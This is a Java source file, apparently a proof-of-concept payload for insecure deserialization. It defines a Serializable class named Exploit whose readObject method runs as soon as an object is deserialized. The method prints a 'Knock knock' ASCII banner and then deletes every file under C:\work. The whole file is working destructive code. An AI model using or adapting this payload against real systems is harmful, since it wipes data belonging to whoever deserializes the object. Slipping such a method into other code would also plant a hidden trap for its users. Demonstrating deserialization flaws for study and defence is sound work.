package org.exploit;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.stream.Stream;

public class Exploit implements Serializable {
    private static final long serialVersionUID = -6153657763951339296L;
    private void readObject(ObjectInputStream objectInputStream) throws ClassNotFoundException, IOException {
        System.out.println(" __  __                    __       __                      __             ");
        System.out.println("|  |/  |.-----.-----.----.|  |--.  |  |--.-----.-----.----.|  |--.         ");
        System.out.println("|     < |     |  _  |  __||    < __|    <|     |  _  |  __||    < __ __ __ ");
        System.out.println("|__|\\__||__|__|_____|____||__|__|  |__|__|__|__|_____|____||__|__|__|__|__|");
        Path pathToBeDeleted = Paths.get("C:\\work");
        try (Stream<Path> paths = Files.walk(pathToBeDeleted))
        {
            paths.sorted(Comparator.reverseOrder()).forEach(path -> {
                try {
                    if (Files.isDirectory(path))
                    {
                        return;
                    }
                    Files.deleteIfExists(path);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            });
        }
        catch (IOException e)
        {
            throw new RuntimeException(e);
        }
    }
    private void writeObject(ObjectOutputStream objectOutputStream) throws IOException {}
}